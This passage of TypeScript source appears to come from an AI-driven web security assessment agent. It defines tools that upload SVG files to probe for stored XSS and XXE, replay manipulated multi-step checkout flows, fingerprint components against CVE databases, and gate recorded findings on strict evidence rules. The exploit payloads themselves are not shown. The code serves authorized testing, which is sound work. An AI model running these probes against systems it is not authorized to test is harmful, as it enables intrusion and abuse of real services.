          return { evId: ev.id, status: res.status, body: res.body, headers: res.headers, urls: extractFetchUrls(res.body, res.headers, url) };
        };
        const fetchUrl = async (u: string, kind: "negative_control" | "positive_replay", tag: string) => {
          if (!isInScope(u, s.scope)) throw new Error(`out of scope: ${u}`);
          const req: HttpRequest = { method: "GET", url: u, headers: authHeaders(s), body: null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const ev = s.evidence.record({
            screenId: s.currentScreenId ?? "pilot",
            validator: "claude-pilot-upload",
            kind,
            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
            response: res,
            note: `upload-fetch ${tag}`,
          });
          return { evId: ev.id, status: res.status, body: res.body };
        };
        try {
          const ctrlUp = await upload("verdict-ctrl.svg", controlSvg(), "negative_control", "control svg");
          const xssUp = await upload(`verdict-xss-${tok}.svg`, xssSvg(tok), "positive_replay", "xss svg #1");
          const ctrlFetchUrl = ctrlUp.urls.find((u) => isInScope(u, s.scope));
          const xssFetchUrl = xssUp.urls.find((u) => isInScope(u, s.scope));
          if (xssFetchUrl) {
            const ctrlGet = ctrlFetchUrl
              ? await fetchUrl(ctrlFetchUrl, "negative_control", "control file")
              : { evId: ctrlUp.evId, status: ctrlUp.status, body: ctrlUp.body };
            const g1 = await fetchUrl(xssFetchUrl, "positive_replay", "xss file #1");
            const g2 = await fetchUrl(xssFetchUrl, "positive_replay", "xss file #2");
            const live = reflectionIsLive(g1.body, tok) && reflectionIsLive(g2.body, tok) && !reflectionIsLive(ctrlGet.body, tok);
            const logic = live
              ? checkLogicEvidence(
                  { status: ctrlGet.status, hasMarker: reflectionIsLive(ctrlGet.body, tok) },
                  [g1, g2].map((p) => ({ status: p.status, hasMarker: reflectionIsLive(p.body, tok) })),
                  { requireSuccess: false },
                )
              : ({ ok: false, reason: "marker not live in fetched SVG" } as const);
            if (live && logic.ok) {
              return txt(
                JSON.stringify({
                  category: "xss-stored",
                  fetchUrl: xssFetchUrl,
                  negativeControl: ctrlGet.evId,
                  positiveReplays: [g1.evId, g2.evId],
                  effectMarker: tok,
                  verdict: `UPLOAD SVG XSS CONFIRMED — fetched ${xssFetchUrl} executes the marker in a live HTML position. record_finding(category xss-stored) with these evidenceIds + effectMarker. An accepted upload alone is not a finding.`,
                }),
              );
            }
          }
          for (const entity of XXE_ENTITY_URLS) {
            const xxeUp = await upload("verdict-xxe.svg", xxeSvg(entity), "positive_replay", `xxe ${entity}`);
            const fetchU = xxeUp.urls.find((u) => isInScope(u, s.scope));
            const samples = [{ evId: xxeUp.evId, status: xxeUp.status, body: xxeUp.body }];
            if (fetchU) {
              samples.push(await fetchUrl(fetchU, "positive_replay", "xxe file #1"));
              samples.push(await fetchUrl(fetchU, "positive_replay", "xxe file #2"));
            }
            const hit = samples.map((p) => disclosureHit(p.body, ctrlUp.body)).find((h) => h && h.category === "secret-exposure") ?? null;
            if (!hit) continue;
            const withMarker = samples.filter((p) => p.body.includes(hit.marker));
            if (withMarker.length < 1) continue;
            const p1 = withMarker[0]!;
            const p2 = withMarker[1] ?? p1;
            // Need two positives: if only the upload body leaked, replay the XXE upload.
            const replay = withMarker.length >= 2 ? p2 : await upload("verdict-xxe.svg", xxeSvg(entity), "positive_replay", `xxe ${entity} replay`);
            const pos2 = withMarker.length >= 2 ? p2 : replay;
            if (!pos2.body.includes(hit.marker)) continue;
            const logic = checkLogicEvidence(
              { status: ctrlUp.status, hasMarker: ctrlUp.body.includes(hit.marker) },
              [{ status: p1.status, hasMarker: true }, { status: pos2.status, hasMarker: pos2.body.includes(hit.marker) }],
              { requireSuccess: false },
            );
            if (!logic.ok) continue;
            return txt(
              JSON.stringify({
                category: "xxe",
                ...(fetchU ? { fetchUrl: fetchU } : {}),
                negativeControl: ctrlUp.evId,
                positiveReplays: [p1.evId, pos2.evId],
                effectMarker: hit.marker,
                detail: hit.detail,
                verdict: `UPLOAD XXE CONFIRMED — ${hit.detail}. record_finding(category xxe) with these evidenceIds + effectMarker. An accepted upload alone is not a finding.`,
              }),
            );
          }
          const fetched = xssFetchUrl ?? ctrlFetchUrl;
          return txt(
            JSON.stringify({
              uploaded: true,
              ...(fetched ? { fetchUrl: fetched } : { fetchUrl: null }),
              negativeControl: ctrlUp.evId,
              positiveReplays: [xssUp.evId],
              verdict: fetched
                ? `not confirmed: uploaded and fetched ${fetched}, but no live XSS marker and no XXE file contents vs the control. Accepted ≠ vulnerability.`
                : "not confirmed: file was accepted but no in-scope fetch URL in the response (and no in-band XXE leak). Do not record a finding from accept-alone; try another field name or browser_upload.",
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    tool(
      "probe_scenario",
      'Confirm a MULTI-STEP business-logic abuse that spans endpoints (coupon stacking/forging, negative quantity/price reaching checkout, skipping a payment/approval/ownership step, mass-assignment escalation, double-spend). You give an ordered `control` flow (legitimate) and an ordered `exploit` flow (manipulated). Each step: {method,url,headers?,body?,capture?}. `capture` maps varName→a JSON path (e.g. data.id, basket.0.id) OR regex applied to THAT step\'s response; later steps reference it as {{varName}} in url/body/headers (thread ids/tokens through the chain). The current session cookie+Bearer are attached automatically. `effectMarker` is a string that appears in a response ONLY when the manipulation is ACCEPTED (the injected total/price, an out-of-order step returning 200, a coupon applied twice). The control flow runs once (must NOT show the marker); the exploit flow runs twice (must show it, stably). Returns evidenceIds (control=negativeControl, exploit=positiveReplays) ready for record_finding with a price-tampering/qty-tampering/workflow-bypass/mass-assignment category.',
      {
        control: z.array(z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), capture: z.record(z.string()).optional() })).min(1),
        exploit: z.array(z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), capture: z.record(z.string()).optional() })).min(1),
        effectMarker: z.string(),
        note: z.string().optional(),
      },
      async ({ control, exploit, effectMarker, note }) => {
        type Step = { method: string; url: string; headers?: Record<string, string>; body?: string | null; capture?: Record<string, string> };
        // 1 フローを順番に実行: {{var}} 置換 → 送信 → 証拠記録 → capture を vars に蓄積。
        const runFlow = async (steps: Step[], kind: "negative_control" | "positive_replay", tag: string) => {
          const vars: Record<string, string> = {};
          let lastStatus = 0;
          // マーカーは「最終ステップのレスポンス」で判定する(record_finding の logic ゲートが引用する
          // 最終ステップ evidence と一致させるため)。効果は確認画面=フロー末尾に出る想定。
          let finalMarker = false;
          const evIds: string[] = [];
          for (let i = 0; i < steps.length; i++) {
            const st = steps[i] as Step;
            const url = substVars(st.url, vars);
            if (!isInScope(url, s.scope)) throw new Error(`step ${i + 1} out of scope: ${url}`);
            const stepHeaders: Record<string, string> = {};
            for (const [k, v] of Object.entries(st.headers ?? {})) stepHeaders[k] = substVars(v, vars);
            const req: HttpRequest = {
              method: st.method.toUpperCase(),
              url,
              headers: { ...authHeaders(s), ...stepHeaders },
              body: st.body != null ? substVars(st.body, vars) : null,
            };
            const res = await s.http.send(req);
            bumpHttp(s, res.status);
            lastStatus = res.status;
            finalMarker = res.body.includes(effectMarker);
            for (const [name, expr] of Object.entries(st.capture ?? {})) {
              const val = extractValue(res.body, expr);
              if (val != null) vars[name] = val;
            }
            const ev = s.evidence.record({
              screenId: s.currentScreenId ?? "scenario",
              validator: "claude-pilot-scenario",
              kind,
              request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
              response: res,
              note: `${note ? note + " " : ""}${tag} · step ${i + 1}/${steps.length} ${req.method} ${url}`,
            });
            evIds.push(ev.id);
          }
          return { status: lastStatus, hasMarker: finalMarker, evId: evIds[evIds.length - 1] as string, evIds };
        };
        let ctrl: Awaited<ReturnType<typeof runFlow>>;
        let ex1: Awaited<ReturnType<typeof runFlow>>;
        let ex2: Awaited<ReturnType<typeof runFlow>>;
        try {
          ctrl = await runFlow(control, "negative_control", "control (legit flow)");
          ex1 = await runFlow(exploit, "positive_replay", "exploit flow #1");
          ex2 = await runFlow(exploit, "positive_replay", "exploit flow #2");
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 200)}`);
        }
        // 証拠規律(マーカーベース): control にマーカー無し + exploit ≥2 にマーカー有り + status<400 + 安定。
        const verdict = checkLogicEvidence(
          { status: ctrl.status, hasMarker: ctrl.hasMarker },
          [ex1, ex2].map((x) => ({ status: x.status, hasMarker: x.hasMarker })),
        );
        return txt(
          JSON.stringify({
            negativeControl: ctrl.evId,
            positiveReplays: [ex1.evId, ex2.evId],
            control: { status: ctrl.status, marker: ctrl.hasMarker, steps: ctrl.evIds.length },
            exploit: [
              { status: ex1.status, marker: ex1.hasMarker, steps: ex1.evIds.length },
              { status: ex2.status, marker: ex2.hasMarker, steps: ex2.evIds.length },
            ],
            verdict: verdict.ok
              ? "WORKFLOW MANIPULATION ACCEPTED — record_finding with these evidenceIds + effectMarker"
              : `not confirmed: ${(verdict as { reason: string }).reason}`,
          }),
        );
      },
    ),
    tool(
      "scenario_done",
      "Finish the scenario (A04 multi-step) stage. Call this once every transactional workflow has been tested. Pass a one-line coverage summary.",
      { summary: z.string() },
      async ({ summary }) => {
        s.scenarioDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🧩 SCENARIO done: ${summary.slice(0, 300)}` } });
        return txt("scenario stage complete.");
      },
    ),
    tool(
      "fingerprint_scan",
      "Fetch one or more in-scope URLs and extract the technology stack from their response headers, cookies, <meta generator> and <script src> (web server, language, framework, CMS, frontend libraries) with versions where available. Known-vulnerable JS library versions are flagged automatically; assess the rest against your own CVE knowledge. Start with the site root and a couple of representative pages / the main JS bundle.",
      { urls: z.array(z.string()).describe("in-scope URLs to fetch & fingerprint (e.g. the root, a JS bundle). 1–12.") },
      async ({ urls }) => {
        const samples: TechSample[] = [];
        const fetched: Array<{ url: string; status?: number; evidenceId?: string; error?: string }> = [];
        for (const url of urls.slice(0, 12)) {
          if (!isInScope(url, s.scope)) continue;
          try {
            const res = await s.http.send({ method: "GET", url, headers: { ...authHeaders(s) }, body: null });
            bumpHttp(s, res.status);
            samples.push({ url, headers: res.headers, body: res.body });
            // 版を明かしたバナーを証拠化 → suspected な vulnerable-component finding の observation に引用できる。
            const ev = s.evidence.record({
              screenId: s.currentScreenId ?? "pilot",
              validator: "claude-pilot-fingerprint",
              kind: "positive_replay",
              request: { method: "GET", url, headers: s.http.effectiveHeaders(authHeaders(s)), body: null },
              response: res,
              note: `fingerprint ${url}`,
            });
            fetched.push({ url, status: res.status, evidenceId: ev.id });
          } catch (e) {
            fetched.push({ url, error: String(e).slice(0, 80) });
          }
        }
        const components = fingerprintTech(samples);
        return txt(
          JSON.stringify({
            fetched,
            components,
            inventory: formatTechInventory(components),
            note: "Versions only. Each fetched URL has an evidenceId (the banner that revealed the version). Assess each (component, VERSION) against KNOWN CVEs. Skip components with version unknown — a product-family banner (Server: BigIP, APM/VPN cookies) plus historical CVEs that may apply is NOT a finding. The ⚠ KNOWN marks are deterministic JS-library matches. For a SERIOUS known CVE (High/Critical, exploitable class) on a MATCHED version, record verdict:'suspected' citing the evidenceId.",
          }),
        );
      },
    ),
    tool(
      "cve_lookup",
      "Look up KNOWN CVEs for detected components in ONLINE CVE databases — OSV.dev (libraries, matched by EXACT version) and NVD (servers/middleware, by keyword). Pass the components returned by fingerprint_scan. Returns authoritative CVE ids + severities; PREFER these over your own recollection and cite the returned CVE ids in findings. (Network egress runs only when CVE-DB lookup is enabled by the operator.)",
      {
        components: z
          .array(z.object({ name: z.string(), version: z.string().nullable().optional(), kind: z.string().optional() }))
          .describe("the detected components to look up (from fingerprint_scan)"),
      },
      async ({ components }) => {
        if (!s.cveLookup)
          return txt(JSON.stringify({ disabled: true, note: "Online CVE-DB lookup is OFF (operator did not pass --cve-lookup). Assess each component against your own CVE knowledge instead." }));
        const KINDS = new Set(["server", "language", "framework", "cms", "frontend-lib"]);
        const comps: TechComponent[] = components.slice(0, 16).map((c) => ({
          kind: (KINDS.has(c.kind ?? "") ? c.kind : "frontend-lib") as TechComponent["kind"],
          name: c.name,
          version: c.version ?? null,
          source: "fingerprint",
          evidence: "",
        }));
        const results = await lookupCves(comps);
        const hits = results.filter((r) => r.cves.length > 0).length;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🛰 cve_lookup: ${comps.length} component(s) → ${hits} with CVE(s) (OSV/NVD)` } });
        return txt(
          JSON.stringify({
            results,
            summary: formatCveResults(results),
            note: "Authoritative DB matches. record_finding(vulnerable-component) for components with real CVEs, citing the CVE id. OSV results are version-matched (high confidence); NVD keyword results may include CVEs for other versions — judge applicability before recording.",
          }),
        );
      },
    ),
    tool(
      "fingerprint_done",
      "Finish the fingerprint (A06 known-vulnerable-components) stage. Call once every detected component has been assessed against known CVEs. Pass a one-line coverage summary.",
      { summary: z.string() },
      async ({ summary }) => {
        s.fingerprintDone = true;
        s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🔎 FINGERPRINT done: ${summary.slice(0, 300)}` } });
        return txt("fingerprint stage complete.");
      },
    ),
    tool(
      "record_finding",
      "Record a vulnerability at one of TWO confidence tiers. verdict='confirmed' (default) requires evidence discipline: ONE `negativeControl` evidenceId (the bug absent, should FAIL) + >=2 `positiveReplays` evidenceIds (the bug reproduced, stable, distinguishable from the control). verdict='suspected' is for a real LEAD you cannot yet fully prove (e.g. a likely IDOR you can't confirm without a second account): it needs a concrete `anomaly` (>=40 chars: what you saw + why it's a lead) AND an OBSERVED anomaly in evidence — either a `negativeControl` + an `observation` evidenceId that measurably DIFFER (a status flip / >64B length delta / an effectMarker only in the observation), or an `observation` that carries a concrete impact (leaked secret / cross-user data / command output). A structural shape alone (a client-controlled id, a field name, an admin-ish path, 'no positive evidence obtained') is NOT a lead and is rejected. Suspected NEVER counts in the confirmed total — it surfaces the lead for manual verification, and is auto-upgraded to confirmed if you later prove it. Pick the canonical `category`; pass the vulnerable `endpoint` (e.g. /orders/{id}) and `param` — findings DEDUPE by (category, endpoint, param). Prefer suspected over silently dropping a screen as clean when you saw something off.",
      {
        title: z.string(),
        severity: z.enum(["info", "low", "medium", "high", "critical"]),
        category: z.enum(CATEGORIES),
        endpoint: z.string(),
        param: z.string().optional(),
        description: z.string(),
        reproSteps: z.string(),
        verdict: z.enum(["confirmed", "suspected"]).default("confirmed"),
        // confirmed 経路:
        negativeControl: z.string().optional(),
        positiveReplays: z.array(z.string()).optional(),
        effectMarker: z.string().optional(),
        // suspected 経路:
        anomaly: z.string().optional().describe("required for verdict=suspected: the ONE observed anomaly + why it is a lead (>=40 chars)"),
        observation: z.string().optional().describe("required for verdict=suspected: ONE cited evidenceId for the anomaly"),
      },
      async ({ title, severity, category, endpoint, param, description, reproSteps, verdict, negativeControl, positiveReplays, effectMarker, anomaly, observation }) => {
        // モデルの severity をカテゴリのバンドに clamp(同クラスでの High/Medium 混在を是正)。
        const normSev = normalizeSeverity(category, severity as Severity);
        // ── 共通コミット(dedup/merge/construct)。confirmed/suspected 両経路が使う。verdict は **昇格のみ**。 ──
        const commit = async (v: FindingVerdict, evidenceIds: string[], anomalyText?: string): Promise<string> => {
          s.recordCalls += 1;
          if (v === "confirmed") s.screenVerdict = "finding";
          else if (s.screenVerdict !== "finding") s.screenVerdict = "suspected"; // finding は上書きしない
          const key = dedupKey(category, endpoint, param, s.targetUrl);
          const existing = s.findingsByKey.get(key);
          if (existing) {
            existing.evidenceIds = [...new Set([...existing.evidenceIds, ...evidenceIds])];
            if (v === "confirmed") existing.severity = maxSev(existing.severity, normSev); // an unproven SUSPECTED re-report must not inflate a confirmed finding's severity
            if (v === "confirmed" && findingVerdict(existing) === "suspected") {
              existing.verdict = "confirmed"; // 後から証明 → 昇格(降格は無い)
              existing.anomaly = undefined;
            }
            existing.description += `\n\n[+] Also observed as "${title}"${s.currentScreenId ? ` (screen ${s.currentScreenId})` : ""}.`;
            s.store.upsertFinding(s.assessmentId, existing);
            s.store.appendEvent(s.assessmentId, {
              type: "note",
              payload: { message: `↩ DEDUP ${existing.id} += "${title}" (${key}; ${existing.evidenceIds.length} ev, sev ${existing.severity}, ${findingVerdict(existing)})` },
            });
            return `merged into ${existing.id} (same ${key}); now ${existing.evidenceIds.length} evidence, severity ${existing.severity}, verdict ${findingVerdict(existing)}. Do not re-report this endpoint+param.`;
          }
          s.findCounter += 1;
          const fid = `f-${String(s.findCounter).padStart(3, "0")}`;
          // Screenshot evidence (best-effort — a request/response alone is hard to read). For an XSS finding, prefer
          // the fire-time proof probe_dom_xss just captured (a visible "DOM-XSS EXECUTED" banner) over a generic
          // current-page shot that wouldn't actually show the XSS. Otherwise capture the current page state.
          let shot: string | undefined;
          const rel = `findings/${fid}.png`;
          const proof = s.xssProof;
          if (proof && Date.now() - proof.at < 120000 && category.toLowerCase().includes("xss")) {
            try {
              renameSync(join(s.artifactsDir, proof.rel), join(s.artifactsDir, rel));
              shot = rel;
            } catch {
              /* proof file moved/missing — fall through to a live capture */
            }
            s.xssProof = undefined; // consumed (or unusable) — don't reuse for a later finding
          }
          if (!shot) {
            try {
              if (await s.driver.saveScreenshot(join(s.artifactsDir, rel))) shot = rel;
            } catch {
              /* no browser page / capture failed — findings still record without it */
            }
          }
          const f: Finding = {
            id: fid,
            dedupKey: key,
            screenId: s.currentScreenId,
            title: `[${category}] ${title}`,
            severity: normSev,
            verdict: v,
            ...(v === "suspected" && anomalyText ? { anomaly: anomalyText } : {}),
            source: { kind: "validator", validatorName: "claude-pilot" },
            description,
            reproSteps,
            evidenceIds,
            scopeBasis: `authorized target ${s.targetUrl}`,
            ...(shot ? { screenshot: shot } : {}),
          };
          s.findings.push(f);
          s.findingsByKey.set(key, f);
          s.store.upsertFinding(s.assessmentId, f);
          s.store.appendEvent(s.assessmentId, {
            type: "note",
            payload: { message: `${v === "suspected" ? "SUSPECTED" : "FINDING"} ${f.id}: ${f.title} [${f.severity}]${f.screenId ? ` @${f.screenId}` : ""}` },
          });
          return `recorded ${f.id} (${v}): ${f.title}`;
        };

        // ── SUSPECTED 経路 ── confirmed のゲート(checkEvidenceDiscipline/checkLogicEvidence)には**一切到達しない**。
        if (verdict === "suspected") {
          // ノイズ抑制: suspected は「深刻な exploitation クラス × medium+」限定。低価値/決定的クラスは confirmed か skip。
          if (normSev === "info" || normSev === "low")
            return txt(`REJECTED: 'suspected' is only for medium+ leads worth a human's verification. An info/low observation is either deterministically confirmable (record verdict:"confirmed") or not worth surfacing — do not mark it suspected.`);
          if (SUSPECT_EXCLUDED_CATEGORIES.has(category)) {
            const isXssCat = category === "xss-reflected" || category === "xss-stored";
            return txt(
              isXssCat
                ? `REJECTED: XSS is marker-provable, not a "suspected" class. Either a unique payload reflected UNESCAPED in a live HTML context (→ record verdict:"confirmed" with control + 2 replays + effectMarker via probe_xss / probe_stored_xss / probe_dom_xss) or you have NOT observed XSS. A field name that "looks like" a raw-HTML sink, an admin-rendered field, or a sibling you believe was confirmed is a HYPOTHESIS — drive probe_stored_xss(store, renderUrl) / probe_dom_xss to the actual render sink and confirm it, otherwise mark the class tested-clean / not-applicable(reason). Do NOT file it suspected.`
                : `REJECTED: '${category}' is deterministically observable (you either saw it or you didn't), not a "suspected" class — if you saw it record verdict:"confirmed" (control + 2 replays), else skip. Reserve 'suspected' for serious exploitation classes you could not fully confirm this run (idor/idor-write/sqli/ssti/rce/path-traversal/ssrf/xxe/auth-bypass/mass-assignment/vulnerable-component/secret-exposure/session).`,
            );
          }
          // version-based CVE(未 exploit)は High/Critical(RCE/path-traversal/auth-bypass 級)だけ surface。
          //   medium/EOL-only の版ノートはアクション性が低くノイズ(PHP EOL・Bootstrap EOL・dev server 等)。
          if (category === "vulnerable-component" && normSev !== "high" && normSev !== "critical")
            return txt(`REJECTED: a version-based 'vulnerable-component' lead is only worth surfacing when its known CVE is High/Critical (RCE / path-traversal / auth-bypass). A medium-CVE or EOL-only version note is low-signal — skip it (or record verdict:"confirmed" if you actually exploit it).`);
          if (!observation || !s.evidence.records.find((r) => r.id === observation))
            return txt(`REJECTED: a suspected finding requires ONE cited 'observation' evidenceId from a probe/http_request THIS run (the single observed anomaly).`);
          if (!anomaly || anomaly.trim().length < 40)
            return txt(`REJECTED: a suspected finding requires a concrete 'anomaly' (>=40 chars): WHAT you observed and WHY it is a lead (e.g. "GET /orders/8123 returned a populated object for an id this session was never authorized to list, while /orders/999999 returned the blank template").`);
          // ── SUBSTANCE (A) ── the cited observation must SHOW an anomaly, not merely exist. Either (a) it DIFFERS from a
          //    cited negativeControl (a clean baseline — a non-existent id / benign input), or (b) it carries a concrete
          //    impact the oracle sees (leaked secret / cross-user data / command output). A structural shape (a client-
          //    controlled id, a field name, an admin-ish path, "no positive evidence obtained") yields NEITHER → rejected.
          //    vulnerable-component is exempt: a version banner is proven by IDENTIFICATION, not a differential (its own
          //    High/Critical-CVE gate above is the substance check).
          const obsRec = s.evidence.records.find((r) => r.id === observation)!;
          if (category === "secret-exposure" && isPublicByDesignClientCredential(obsRec.response.body))
            return txt("REJECTED: client credential is public by design (Maps JS key, Firebase web apiKey, or reCAPTCHA site key). Not a suspected secret. Do not record.");
          if ((category === "idor" || category === "idor-write") && classifyCrossUserBody(obsRec.response.body).class === "public-directory")
            return txt("REJECTED: observation is a PUBLIC DIRECTORY (tenant people-picker, or a store/location/dealer locator). Typically intended, not IDOR — suspected or confirmed. Mark idor tested-clean unless the body also has a person's phone/home address/SSN/DOB, another tenant's private object, or order/hold/document contents.");
          if (
            category === "vulnerable-component" &&
            isVersionlessComponentLead(`${title}\n${anomaly ?? ""}\n${description}`, obsRec.response.headers, obsRec.response.body)
          )
            return txt("REJECTED: a suspected vulnerable-component lead requires a CONCRETE VERSION in the cited response that the writeup actually names (Server/X-Powered-By/MicrosoftSharePointTeamServices/meta generator/script src). A product-family banner (server: BigIP), a SharePoint hive path (/_layouts/15/, corev15.css — not SharePoint 2013), or historical CVEs that may apply depending on patch level is not a finding. Skip. If you later exploit a specific CVE, record that class confirmed.");
          const ctrlRec = negativeControl ? s.evidence.records.find((r) => r.id === negativeControl) : undefined;
          if (category !== "vulnerable-component") {
            let differs = observationDiffersFromControl(ctrlRec ? { status: ctrlRec.response.status, body: ctrlRec.response.body } : undefined, { status: obsRec.response.status, body: obsRec.response.body }, effectMarker);
            // Injection/execution classes: a bare body-length delta between two pages does NOT count — require a marker
            // present only in the observation, or a status flip (kills the "two different pages differ by >64B" fake SSRF/SQLi).
            if (differs && MARKER_REQUIRED_SUSPECT_CATEGORIES.has(category)) {
              const markerHit = !!effectMarker && obsRec.response.body.includes(effectMarker) && !(ctrlRec && ctrlRec.response.body.includes(effectMarker));
              const statusFlip = !!ctrlRec && ctrlRec.response.status !== obsRec.response.status;
              differs = markerHit || statusFlip;
            }
            const carriesImpact = impactOracle(obsRec.response.body).length > 0;
            // Session glance: the anomaly lives in the REQUEST (Cookie / Authorization), not a response differential.
            const sessionGlance = category === "session" && obsRec.validator === "claude-pilot-session";
            if (!differs && !carriesImpact && !sessionGlance)
              return txt(
                `REJECTED (no observed anomaly): observation ${observation} demonstrates nothing on its own — it neither DIFFERS from a cited 'negativeControl' (a clean baseline: a non-existent id / benign input) nor carries a concrete impact (leaked secret / cross-user data / command output) the oracle can see. A suspected lead needs an anomaly you OBSERVED, not the endpoint's shape (a client-controlled id, a field name, an admin-ish path). Cite a 'negativeControl' the observation visibly differs from (a status flip / >64B length delta / an 'effectMarker' present only in the observation), or an observation that carries a real impact — or confirm it outright (control + 2 replays). For a weak-looking cookie/Bearer, run analyze_session and cite THAT evidenceId (verdict suspected). If the effect is genuinely out-of-band (nothing observable in-band), mark the class tested with that note instead of filing a suspected finding.`,
              );
          }
          const suspectEv = ctrlRec ? [negativeControl!, observation] : [observation];
          return txt(await commit("suspected", suspectEv, anomaly.trim()));
        }

        // ── CONFIRMED 経路 ── schema を optional 化したので、まず存在を手で強制(その後は従来どおり)。
        if (!negativeControl || !positiveReplays || positiveReplays.length < 2)
          return txt(`REJECTED: a confirmed finding requires 1 negativeControl + >=2 positiveReplays evidenceIds. If you have a real lead you cannot fully prove yet, use verdict:"suspected" with an 'anomaly' + one 'observation' instead of dropping it.`);
        // auth-bypass は verify_access の機械判定を通った時だけ記録できる(CRM の 302/401 誤検知を硬く封じる)。
        if (category === "auth-bypass") {
          const av = s.accessVerdicts.get(normEndpoint(endpoint, s.targetUrl));
          if (av === "not_bypass")
            return txt(`REJECTED: verify_access on ${endpoint} returned 'not_bypass' (redirect→login / 401 / 403 = auth is enforced). Mechanical veto, cannot record.`);
          if (!av) return txt(`REQUIRED: run verify_access(${endpoint}) before recording auth-bypass (302→login / 401 / 403 is not a bypass).`);
        }
        // ── 証拠規律の構造強制 ── 引用 evidenceId が実在し、ネガコンが positive と区別でき、positive 同士が安定であること。
        const findEv = (eid: string) => s.evidence.records.find((r) => r.id === eid);
        const negRec = findEv(negativeControl);
        const posRecs = positiveReplays.map((eid) => findEv(eid));
        const missing = [negativeControl, ...positiveReplays].filter((eid) => !findEv(eid));
        if (!negRec || posRecs.some((r) => !r))
          return txt(`REJECTED: unknown evidenceId(s) ${missing.join(", ")}. Cite ids returned by http_request / verify_access / probe_logic in THIS run (1 negativeControl + >=2 positiveReplays).`);
        if (MARKER_BASED_CATEGORIES.has(category)) {
          // マーカーベース: 長さ差分でなく「印(effectMarker)」の有無で確証する。
          //   business-logic → probe_logic/probe_scenario の effectMarker / xss → 未エスケープ反射 / redirect → OOB host。
          if (!effectMarker)
            return txt(`REJECTED: ${category} requires effectMarker (the string that appears only when the issue fires — the unescaped payload for xss, the OOB host for open-redirect, the injected total for business-logic, the valid-account phrase for user-enumeration). Run the matching probe and cite its evidenceIds + the marker.`);
          // マーカーは body だけでなくヘッダも見る(open-redirect の印は Location ヘッダに出る)。
          // XSS は「live HTML 位置での反射」= 実行可能文脈のみ有効(<script>/flight-data JSON 内の反射は不活性 → refute)。
          const isXss = category === "xss-reflected" || category === "xss-stored";
          const isRedirect = category === "open-redirect";
          const allowNon2xx = isXss || category === "user-enumeration" || category === "secret-exposure" || category === "info-disclosure" || category === "ssrf" || category === "xxe" || category === "path-traversal";
          const hasMarker = (r: { body: string; headers: Record<string, string>; finalUrl?: string }): boolean =>
            isXss
              ? reflectionIsLive(r.body, effectMarker)
              : isRedirect
                ? locationTargetsHost(r.headers?.["location"], r.finalUrl ?? "", effectMarker) // parsed Location target host, not a substring (a same-site ?url= reflection doesn't count)
                : r.body.includes(effectMarker) || JSON.stringify(r.headers ?? {}).includes(effectMarker);
          const verdict = checkLogicEvidence(
            { status: negRec.response.status, hasMarker: hasMarker(negRec.response) },
            posRecs.map((r) => ({ status: r!.response.status, hasMarker: hasMarker(r!.response) })),
            { requireSuccess: !allowNon2xx },
          );
          if (!verdict.ok) return txt(`REJECTED (logic evidence): ${verdict.reason}.`);
          if (category === "secret-exposure" && posRecs.every((r) => isPublicByDesignClientCredential(r!.response.body, effectMarker)))
            return txt("REJECTED: client credential is public by design (Maps JS key in maps.googleapis.com/maps/api/js, Firebase web apiKey, or reCAPTCHA site key). Restricted in the vendor console, not by hiding the key. Not secret-exposure. Do not record.");
          if (category === "info-disclosure" && posRecs.every((r) => looksLikePublicWebFile(r!.response.body)))
            return txt("REJECTED: robots.txt / sitemap.xml are public files by design. A Sitemap: line (including one pointing at production from a test host) is not info-disclosure. Do not record.");
        } else if (category === "headers") {
          // Absence class: two stable GETs of the same URL. The issue is a missing header, so control and positives
          // are allowed to be the same response (CLI header-audit works the same way). Still require the cited
          // responses to actually miss the checked header (param = rule key, e.g. csp).
          if (posRecs.length < 2) return txt("REJECTED: headers requires >=2 GET evidenceIds (probe_headers).");
          const p0 = posRecs[0]!;
          if (looksLikeProxyError(p0.response.body))
            return txt("REJECTED: the cited response is an upstream proxy/connection error page (host unreachable through the proxy), not the target — the host was never actually reached. Do not record header findings on it.");
          if (!posRecs.every((r) => r!.response.status === p0.response.status))
            return txt("REJECTED: header-audit replays disagree (unstable).");
          const hdrLc: Record<string, string> = {};
          for (const [k, v] of Object.entries(p0.response.headers ?? {})) hdrLc[k.toLowerCase()] = v;
          const missing = auditHeaders(hdrLc, p0.request.url);
          if (missing.length === 0) return txt("REJECTED: cited responses already carry the checked security headers.");
          if (param && !missing.some((r) => r.key === param || r.header === param.toLowerCase()))
            return txt(`REJECTED: '${param}' is present (or not a checked rule). Missing: ${missing.map((r) => r.key).join(", ")}.`);
        } else if (category !== "auth-bypass") {
          if (category === "sqli" && sqliHtmlLengthOnlyFp(negRec.response.body, posRecs.map((r) => r!.response.body), negRec.response.status, posRecs.map((r) => r!.response.status)))
            return txt("REJECTED: cited SQLi evidence is HTML/text length (search/result-page variance), not a JSON/XML boolean differential, a SQL error, or TIME-BASED BLIND SQLi CONFIRMED. That is the Drupal/marketing-search false positive — do NOT confirm. Re-run probe_sqli and record only if it returns SQLi CONFIRMED.");
          if ((category === "idor" || category === "idor-write") && posRecs.every((r) => classifyCrossUserBody(r!.response.body).class === "public-directory"))
            return txt("REJECTED: cited bodies are a PUBLIC DIRECTORY (tenant people-picker, or a store/location/dealer locator — og:type place, Find a Station, sequential store ids). Typically intended, not IDOR. Do not confirm. Mark idor tested-clean unless the body also has a person's phone/home address/SSN/DOB, another tenant's private object, or order/hold/document contents.");
          // IDOR proven by cross-user CONTENT, not length: if every positive carries real cross-user data (sensitive-pii /
          // private-object) that the control does not, a SMALL victim object (e.g. 30B vs a 13B denial, |Δ|<64) is still a
          // real finding — the leaked content is the proof. Bypass the body-length gate for this content-proven case only.
          const idorContentProven =
            (category === "idor" || category === "idor-write") &&
            posRecs.every((r) => {
              const cl = classifyCrossUserBody(r!.response.body).class;
              return cl === "sensitive-pii" || cl === "private-object";
            }) &&
            !["sensitive-pii", "private-object"].includes(classifyCrossUserBody(negRec.response.body).class);
